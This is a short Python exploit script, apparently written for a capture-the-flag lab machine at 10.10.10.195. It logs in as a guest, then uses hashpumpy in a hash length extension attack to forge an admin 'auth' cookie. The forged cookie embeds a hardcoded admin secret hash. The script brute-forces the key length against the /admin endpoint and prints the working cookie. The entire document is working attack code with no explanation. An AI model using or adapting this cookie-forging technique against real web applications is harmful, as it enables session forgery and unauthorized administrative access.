#!/usr/bin/python3

import requests
from base64 import b64encode, b64decode
from hashpumpy import hashpump
import binascii
import sys

url = "http://10.10.10.195/"

username = "guest"
password = "guest"
admin_username = "admin"
admin_secret = "f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105"


def get_cookie():
    r = requests.post(url + "postlogin", data = {"username": username, "password" : password})

    return r.cookies["auth"]

def get_admin_cookie(data, sig): 
    data_to_add = ";username=" + admin_username + ";secret=" + admin_secret + ";"

    for i in range(8, 15):
        (new_sig, new_data) = hashpump(sig.hex(), data, data_to_add, i)
        b64_new_data = b64encode(new_data).decode('utf-8')
        b64_new_sig = b64encode(binascii.unhexlify(new_sig)).decode('utf-8')
        cookie = b64_new_data + "." + b64_new_sig
        resp = requests.get(url + "/admin", cookies = { "auth" : cookie })
        if resp.status_code == 200:
            return str(cookie)
            break



current_cookie = get_cookie()
(b64data, b64sig) = current_cookie.split('.')

data = b64decode(b64data)
#print(data)
sig = b64decode(b64sig)
#print(sig.hex())

admin_cookie = get_admin_cookie(data, sig)

print(admin_cookie)



